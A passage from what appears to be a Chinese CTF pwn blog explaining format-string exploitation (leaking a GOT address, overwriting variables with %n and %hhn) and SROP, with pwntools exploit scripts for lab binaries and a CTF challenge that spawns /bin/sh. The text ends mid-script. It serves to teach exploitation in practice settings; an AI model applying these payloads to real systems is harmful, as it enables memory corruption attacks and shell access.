punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现格式化字符串的起始地址是格式化字符串的第10个参数</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/10.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./leak"</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io, 'b main')</span><span class="token comment">#pause()</span><span class="token comment">#context.log_level = 'debug'</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%10$s'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功泄漏<code>puts</code>函数地址</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/11.png"></p><h4 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h4><p>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span>n<span class="token punctuation">,</span>不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试程序来自wiki：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加了一句</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload：</p><pre class="line-numbers language-none"><code class="language-none">...[overwrite addr]....%[overwrite offset]$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所<strong>要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数</strong>。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h5 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h5><ul><li><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输<strong>出了 c 变量的地址。</strong></p></li><li><p>确定相对偏移：其次，我们来确定一下<strong>存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。</strong> 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试：</p></li></ul><p>可以发现格式化字符串的地址为0xffffcfff8，则(0xffffcfff8 - 0xffffcfe0) // 4 = 6，所有格式化字符串的地址为格式化字符串的第6个参数，为printf的第7个参数</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/12.png"></p><ul><li>进行覆盖</li></ul><p>这样，我们便可以利用 %n 的特征来修改 c 的值。payload 如下：</p><p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。%6$n是把之前输出的字符个数写入格式化字符串的第6个参数。</p><pre class="line-numbers language-none"><code class="language-none">[addr of c]%012d%6$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow"</span><span class="token punctuation">)</span>c_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%12d%6$n'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    c<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功输出 modified c. </p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/13.png"></p><h5 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h5><h6 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h6><p>首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。如果我们还是将<strong>要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</strong></p><p>那么我们应该怎么做呢？其实没必要将所要覆盖的变量的地址放在字符串的最前，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aa<span class="token operator">%</span>k$nxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么<strong>其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数</strong>，后面我们<strong>如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8</strong>，其实就可以覆盖了。</p><ul><li>确定覆盖地址：a是初始化的全局变量，在bss段中，直接在IDA里面找：0x804A024</li></ul><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/14.png"></p><ul><li>确定相对偏移</li></ul><p>根据上面分析，为格式化字符串第8个参数</p><ul><li>进行覆盖</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token char">'aa%8$naa'</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x804A028</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow"</span><span class="token punctuation">)</span>c_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%12d%6$n'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804A028</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/15.png"></p><p>总结：其实，我们没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p><h6 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h6><p>首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以<strong>小端存储，即最低有效位存储在低地址</strong>。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">hh 对于整数类型，printf期待一个从<span class="token keyword">char</span>提升的<span class="token keyword">int</span>尺寸的整型参数。h  对于整数类型，printf期待一个从<span class="token keyword">short</span>提升的<span class="token keyword">int</span>尺寸的整型参数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以说，我们可以利用**%hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。**这里，我们以单字节为例。</p><ul><li><p>确定覆盖地址：同a一样的方法，地址为：0x804A02C</p></li><li><p>确定相对偏移：我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><pre class="line-numbers language-none"><code class="language-none">0x0804A028 \x780x0804A029 \x560x0804A02a \x340x0804A02b \x12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先，由于我们的字符串的偏移为 6，所以确定我们的 payload 基本是这个样子的</p><pre class="line-numbers language-none"><code class="language-none">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$hhn'+pad2+'%7$hhn'+pad3+'%8$hhn'+pad4+'%9$hhn'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进行覆盖</p></li></ul><p>payload构造(来自wiki：</p><p>其中每个参数的含义基本如下：</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#如果之前输出的字符个数&lt;要填写的值，就需要补上(wrod-prev)个字符输出</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span> <span class="token comment">#如果之前输出的字符个数=要填写的值，就不需要pad了</span>        result <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#如果之前输出的字符个数&gt;要填写的值</span>    <span class="token comment">#因为我们只填写一个字节，所以我们只需要低字节为我们要填写的值即可</span>    <span class="token comment">#比如prev=0x78 word=0x56</span>    <span class="token comment">#那么我们就需要补上一些pad，使得之前输出的子串个数为prev+pad = 0x156</span>    <span class="token comment">#所以pad = 0x156 - prev = 0x100 + word - prev = 256 + word - prev</span>    <span class="token comment">#注意为什么是0x156,而不是0x256等等,有的同学会问，如果前面已经输出0x178个字符，那这样算出来pad不是负数吗？</span>    <span class="token comment">#其实是这样的，但是因为我们是一个字节一个字节的填写，所以我们传入的prev也只是一个字节，可以看fmt_str函数，所以就统一成了0x100，因为0x200,0x300其实没有区别，因为我们只需要低字节</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token comment">#根据机器字长构造前面要覆盖的地址</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#payload现在的长度</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#我们一个字节一个字节的填写，所以需要填写4次</span>        <span class="token comment">#prev之前输出字符的个数</span>        <span class="token comment">#(target &gt;&gt; i * 8) &amp; 0xff 我们要覆盖的单字节的值</span>         <span class="token comment">#比如0x12345678第1次 (0x12345678 &gt;&gt; 0 * 8) &amp; 0xff = 0x78</span>         <span class="token comment">#第2次  (0x12345678 &gt;&gt; 1 * 8) &amp; 0xff = 0x56 ....</span>        <span class="token comment">#覆盖的偏移：</span>         <span class="token comment">#比如0x78它的偏移就是offset，而0x56的偏移为offset+1 ....</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token comment">#之前输出字符的个数</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A02C</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/16.png"></p><p>参考文章：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-SROP</title>
      <link href="/2023/04/08/pwn-srop/"/>
      <url>/2023/04/08/pwn-srop/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h3><h4 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h4><p><code>signal</code>机制是类unix系统中进程间通信的一种方式。我们称其为软中断信号，或者软中断。一般分为三步：</p><p><img src="/2023/04/08/pwn-srop/ProcessOfSignalHandlering.png" alt="图片来自wiki"></p><ul><li>内核向某个进程发送 <code>signal</code> 机制，该进程会被暂时挂起，进入内核态；</li><li>内核会为该进程保存相应的上下文，之后跳转到注册好的 <code>signal handler</code> 中处理相应的 <code>signal</code>；</li><li><code>signal handler</code> 返回后，内核执行 <code>sigreturn</code> 系统调用，为该进程恢复之前保存的上下文。</li></ul><p>1、<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 <code>signal</code> 的时候会被间接地调用。</p><p>2、内核在保存进程相应的上下文时，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址，需要注意的是，这一部分是在用户进程的地址空间的</strong>。称 <code>ucontext</code> 以及 <code>siginfo</code> 这一段为 <code>Signal Frame</code>，此时栈结构如下：</p><p><img src="/2023/04/08/pwn-srop/signal2-stack.png"></p><p>3、内核在恢复进程相应的上下文时，<strong>其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行</strong>。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>内核在 <code>signal</code> 信号处理的过程中的工作，主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 <code>Signal Frame</code> 中。但是需要注意的是：</p><ul><li><code>Signal Fram</code>e 被保存在<strong>用户的地址空间中，所以用户是可以读写的</strong>。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 <code>signal</code> 对应的 <code>Signal Frame</code>，所以<strong>当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame</strong>。</li></ul><p>也就是说我们可以伪造一个<code>Signal Frame</code>，然后主动去执行 <code>sigreturn</code> 系统调用，这时内核会以为我们是从<code>singal hanlder</code>返回的，所以就会恢复进程上下文，这时就可以修改所有寄存器的值为我们伪造<code>Sinal Frame</code>中的值。</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>1、如下图，我们在栈中伪造一个<code>Sinal Frame</code>，当我们执行 <code>sigreturn</code> 系统调用时，寄存器中的值就会被修改：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax<span class="token operator">=</span><span class="token number">59</span>rdi<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token string">"/bin/sh"</span>rsi<span class="token operator">=</span><span class="token number">0</span>rdx<span class="token operator">=</span><span class="token number">0</span>rip<span class="token operator">=</span><span class="token operator">&amp;</span>syscall这就是execv的一个系统调用，接下来会去执行<span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/pwn-srop/srop-example-1.png"></p><p>2、在1）例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可：</p><ul><li><strong>控制栈指针rsp。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 <code>syscall</code> 返回的时候，栈指针都会指向下一个 <code>Signal Frame</code>。因此就可以执行一系列的 <code>sigreturn</code> 函数调用。</p><p><img src="/2023/04/08/pwn-srop/srop-example-2.png"></p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容(伪造Signal Frame</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall(syscall_ret)</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 Signal Frame</li></ul><p>对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现 sigreturn 调用。而 <strong>RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制</strong>，比如说 read 函数的返回值为读取的字节数。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><h5 id="360春秋杯——smallest-pwn"><a href="#360春秋杯——smallest-pwn" class="headerlink" title="360春秋杯——smallest-pwn"></a>360春秋杯——smallest-pwn</h5><p>程序只开启了NX保护，但是代码甚少，我们可用的代码如下图：</p><p>程序直接向栈顶写入0x400个字符</p><p><img src="/2023/04/08/pwn-srop/1.png"></p><ul><li>这个题就是典型的<strong>通过 read 函数返回值来间接修改RAX 寄存器的值</strong></li><li>题目中并没有<code>/bin/sh</code>字符串，这里需要我们自己写入，但这个程序很小没有BSS段，所以我们直接把<code>/bin/sh</code>写在栈上<ul><li>所以我们要泄漏栈地址</li><li>然后把<code>/bin/sh</code>写入栈上</li></ul></li><li>伪造Signal Frame，执行execv函数</li></ul><p><strong>exp：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25526</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./smallest"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""0x4000B0 xor rax, rax0x4000B3 mov edx, 400h    0x4000B8 mov rsi, rsp 0x4000BB mov rdi, rax  0x4000BE syscall 0x4000C0 ret"""</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x4000BE</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token comment">#这里需要三次,第一次修改低字节为B3,第二次泄漏栈地址,第三次写入payload执行后期操作</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\xB3'</span><span class="token punctuation">)</span> <span class="token comment">#把低字节修改为B3,而跳过xor rax,rax,且read只读入一个字符,所以返回值rax=1,为write系统调用号</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#控制rsp到stack上</span>read_frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>read_frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>read_frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>read_frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> stackread_frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x400</span>read_frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stackread_frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>read_frame<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span 